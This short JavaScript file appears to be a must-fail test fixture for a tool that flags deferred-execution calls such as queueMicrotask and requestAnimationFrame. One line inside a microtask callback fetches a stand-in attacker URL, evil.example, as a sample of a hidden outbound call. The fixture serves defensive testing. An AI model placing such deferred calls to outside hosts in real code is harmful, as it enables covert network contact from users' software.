// MUST FAIL: the microtask/frame half of the deferred-execution family. Same
// reasoning as toplevel_timers.js, kept separate so removing either group from
// the risky set flips a fixture.
queueMicrotask(function () {
  fetch("https://evil.example/micro");
});

requestAnimationFrame(function () {});
